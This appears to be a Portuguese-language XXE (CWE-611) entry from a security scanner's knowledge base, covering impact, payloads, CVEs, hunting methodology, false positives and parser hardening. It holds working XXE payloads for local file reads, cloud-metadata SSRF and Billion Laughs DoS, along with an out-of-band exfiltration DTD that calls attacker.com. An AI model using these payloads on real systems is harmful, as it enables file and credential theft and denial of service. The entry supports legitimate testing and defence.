---
id: xxe
title: "XML External Entity Injection"
module: "xxe"
severity: "HIGH"
cwe_id: "CWE-611"
cwe_title: "Improper Restriction of XML External Entity Reference"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "injection.xml_external_entity_injection"
---

## Summary
Parsers XML que resolvem entidades externas permitem leitura de arquivos locais, SSRF, exfiltração out-of-band e, em alguns casos, RCE. Qualquer endpoint que aceite XML, SVG, DOCX/XLSX ou SOAP pode ser afetado.

## Description
XML permite declarar entidades personalizadas no `DOCTYPE`. Quando o parser tem `external entities` habilitadas, uma entidade pode referenciar `file://`, `http://` ou outros esquemas, e o conteúdo é resolvido durante o parse. Isso permite:

- **XXE clássico:** conteúdo do arquivo é refletido na resposta.
- **XXE cego:** sem reflexão, confirmado via OOB (DNS/HTTP) ou erro.
- **XXE OOB:** entidades parametrizadas e DTD externo exfiltram dados para um servidor controlado.
- **SSRF via XXE:** requisições internas para metadata/cloud e serviços internos.
- **Billion laughs / DoS:** expansão de entidades causa consumo de memória/CPU.
- **RCE:** via `expect://` (PHP), desserialização em Java ou cadeias específicas de parser.

Formatos alternativos que carregam XML: SVG, DOCX, XLSX, PPTX, SOAP, RSS, SAML, XHTML, configurações e uploads "XML".

## Impact
- Leitura de arquivos sensíveis (`/etc/passwd`, chaves, configurações, `.env`).
- Roubo de credenciais cloud via metadata (SSRF).
- Exfiltração de dados internos e movimento lateral.
- DoS por expansão de entidades.
- Em casos específicos, execução remota de código.
- Impacto HIGH; pode ser CRITICAL com RCE ou credenciais cloud.

## Payloads and Bypasses
```xml
<!-- XXE clássico: leitura de arquivo -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

```xml
<!-- XXE via PHP filter -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>
```

```xml
<!-- SSRF via XXE para metadata -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

```xml
<!-- XXE cego com DTD externo -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

`evil.dtd`:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>">
%all;
```

```xml
<!-- XXE OOB com parâmetro -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/collect?data=test">
  %xxe;
]>
```

Variações e bypasses:
```text
- SVG: <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
- DOCX/XLSX: inserir evil.xml em word/document.xml ou [Content_Types].xml
- SOAP: colocar DOCTYPE antes de <soap:Envelope>
- UTF-16/UTF-7 encoding para bypass de filtros
- Entidades parametrizadas quando entidades gerais são bloqueadas
- `SYSTEM "file:///etc/hostname"` para confirmar leitura
- `expect://id` em PHP com expect habilitado
- `jar:file:///...!/` e `gopher://` para SSRF
- Negação de serviço: Billion Laughs
```

Billion Laughs:
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

Casos reais e mentalidade de ataque (RWBH): Yahoo (parsers XML em mail/upload) e Facebook (DOCX/XLSX) mostram que o vetor não é só SOAP; o atacante testa SVG, DOCX, SAML e OOB quando a resposta não reflete o arquivo.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2018-17247 | Elasticsearch | 2018 | XXE no find_file_structure API do ML -- leitura de arquivo e SSRF se policy de rede permitir | File disclosure |
| CVE-2018-20843 | libexpat | 2019 | Billion Laughs via nomes XML com muitos colons -- DoS exponencial no parser | DoS (entity expansion) |
| CVE-2019-12415 | Apache POI | 2019 | XXE ao converter documentos Excel via XSSFExportToXml -- leitura de arquivo local | File disclosure |
| CVE-2018-11788 | Apache Karaf | 2019 | XXE via features deployer no hot deploy -- permite resolver entidades externas | File disclosure |
| CVE-2020-26258 | XStream | 2020 | SSRF via XXE em deserializacao XML -- atacante controla URL de entidade externa | SSRF via XXE |
| CVE-2020-26259 | XStream | 2020 | Delecao arbitraria de arquivo via deserializacao XML maliciosa | File manipulation |
| CVE-2021-23926 | Apache XMLBeans | 2021 | Parser XML sem properties de seguranca -- Billion Laughs e XXE out-of-band | OOB + DoS |
| CVE-2021-29505 | XStream | 2021 | RCE via desserializacao de objeto embarcado em XML | RCE via XML |

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `xml`, `data`, `document`, `file`, `upload`, `content`, `body`, `payload`, `svg`, `feed`, `soap`, `saml`, `config`.
- **Paths comuns:** `/api/import`, `/upload`, `/xml`, `/soap`, `/saml`, `/parse`, `/convert`, `/preview`, `/avatar`, `/invoice`, `/export`.
- **Sinais:** `Content-Type: application/xml`, `text/xml`, `application/soap+xml`; upload de SVG/DOCX/XLSX; resposta contém conteúdo de arquivo; erros de parser com path local.

## Escalation Techniques
XXE pode ser escalado bem alem da leitura de um unico arquivo:

- **Leitura de arquivos sensiveis:** usar `file://` para extrair `/etc/shadow`, chaves SSH, `.bash_history`, arquivos de configuracao e codigo-fonte. O `.bash_history` e particularmente util por conter URLs internas, IPs e caminhos de arquivos.
- **SSRF via XXE:** substituir a URL da entidade externa por enderecos internos (`http://10.0.0.1:80`, `http://169.254.169.254/latest/meta-data/`) para port scan da rede interna e exfiltracao de metadata cloud (AWS IAM credentials).
- **XXE cego com DTD externo:** quando a resposta nao reflete o conteudo, hospedar um DTD externo no servidor do atacante com parameter entities que enviam os dados em URL parameter ou via erro (File Not Found com dados no path).
- **Exfiltracao via erro:** forcar erro referenciando arquivo inexistente cujo path inclui o conteudo do arquivo-alvo -- o parser retorna o conteudo no stack trace do erro.
- **DoS (Billion Laughs):** entidades recursivas que expandem exponencialmente (um `lol9` vira um bilhao de `lol`), consumindo memoria do parser ate crash. Nunca testar em producao.
- **CDATA para arquivos com caracteres especiais:** envolver conteudo em tags `<![CDATA[...]]>` no DTD externo para exfiltrar arquivos XML ou com `<`, `>`, `&` sem quebrar a sintaxe.
- **PHP wrappers e FTP:** em alvos PHP, usar `php://filter/convert.base64-encode/resource=` para codificar binarios; usar FTP em vez de HTTP para contornar restricoes de caracteres especiais e limite de tamanho de URL.
- **Pivot para rede interna:** informacoes obtidas via SSRF (portas abertas, servicos, metadata) permitem pivotar para servicos internos nao expostos.

Ao avaliar impacto, considere: o parser permite SYSTEM/PUBLIC? Ha reflexao na resposta ou e blind? O servidor faz requests outbound? Quais arquivos sao acessiveis com as permissoes do processo?

## Hunting Methodology
Processo passo a passo para identificar XXE:

1. **Encontrar pontos de entrada XML:** mapear endpoints que recebem XML diretamente (POST body, SOAP), ou que aceitam formatos baseados em XML (SVG, DOCX, XLSX, PPTX, RSS, SAML). Buscar a string `<?xml` e blocos base64 que comecem com `LD94bWw` (que e `<?xml` em base64).
2. **Forcar processamento XML:** em endpoints que aceitam JSON ou texto, alterar o `Content-Type` para `text/xml` ou `application/xml` e enviar XML no body -- alguns parsers processam XML mesmo sem ser o formato padrao.
3. **Testar XXE classico:** inserir entidade simples (`<!ENTITY test "Hello!">`) e verificar se e resolvida. Depois testar `SYSTEM "file:///etc/hostname"`. Se `SYSTEM` nao funcionar, tentar `PUBLIC "abc" "file:///etc/hostname"`.
4. **Testar XXE cego (blind):** se nao ha reflexao na resposta, configurar callback listener e usar entidade externa apontando para seu servidor (`http://attacker:80/xxe_test.txt`). Verificar logs por request recebido. Testar portas 80 e 443 primeiro para contornar firewalls.
5. **Embutir payload em diferentes formatos:** inserir XXE em SVG (adicionar DTD e `<text>&xxe;</text>`), em DOCX (editar `/word/document.xml` e reempacotar com `zip -r`), XLSX e PPTX.
6. **Testar XInclude:** quando nao ha controle sobre o documento XML inteiro, usar `<xi:include parse="text" href="file:///etc/hostname"/>` no campo de input.
7. **Escalar:** se leitura de arquivo funcionar, tentar arquivos mais sensiveis (`/etc/shadow`, `~/.bash_history`). Se blind funcionar, tentar exfiltrar via DTD externo ou erro.
8. **Tentar SSRF:** substituir URL da entidade por endpoints internos e metadata cloud.

## False Positive Indicators
Sinais de que a deteccao pelo scanner **nao e XXE exploravel**:

- **Parser com DTD desabilitado:** muitos parsers modernos desabilitam DTDs ou entidades externas por padrao (ex: Java com `FEATURE_SECURE_PROCESSING`, .NET com `DtdProcessing.Prohibit`). A presenca de endpoint XML nao implica vulnerabilidade.
- **WAF/proxy bloqueando DOCTYPE:** se o request com `<!DOCTYPE` e rejeitado antes de chegar ao parser, a vulnerabilidade nao e alcancavel. O scanner pode reportar "aceita XML" sem confirmar processamento de entidade.
- **Resposta identica com e sem entidade:** se o canary (`&test;`) nao aparece resolvido na resposta e nao ha callback OOB, o parser pode estar ignorando entidades.
- **Content-Type forcado mas ignorado:** alterar Content-Type para `application/xml` pode receber 200, mas o server pode nao estar parseando o body como XML -- verificar se o conteudo da entidade realmente aparece.
- **Entidade resolvida mas acesso restrito:** o parser pode resolver entidades internas (`<!ENTITY x "hello">`) mas bloquear `SYSTEM`/`PUBLIC` -- isso mostra processamento de DTD mas nao e XXE.
- **Arquivo inacessivel por permissao:** mesmo com XXE confirmado, o processo pode nao ter permissao para ler arquivos sensiveis. Erro de acesso nao significa ausencia de vuln, mas limita impacto.
- **Formato nao-XML tratado como XML:** scanner detecta upload de SVG/DOCX mas o servidor nao processa o XML internamente (ex: armazena como blob sem parse).

## Recommendation
1. Desabilitar DTDs e entidades externas no parser. Em Java:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```
2. Para StAX/SAX, desabilitar `external-general-entities`, `external-parameter-entities` e `load-external-dtd`; usar `XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = false`.
3. Para Python, usar `defusedxml`; para .NET, `XmlReaderSettings.DtdProcessing = Prohibit` e `XmlResolver = null`.
4. Preferir JSON quando possível; se XML for necessário, validar contra XSD e rejeitar `DOCTYPE`.
5. Limitar tamanho de payload, profundidade e expansão de entidades; configurar timeout e memória.
6. Em uploads, validar tipo real, desabilitar processamento de XML em SVG/DOCX e usar sandbox para conversão.
7. Segregar o parser de XML em serviço isolado, sem acesso a filesystem/network, quando inevitável.
8. Monitorar requisições com `DOCTYPE`, `SYSTEM`, `PUBLIC`, `file://` e chamadas OOB.
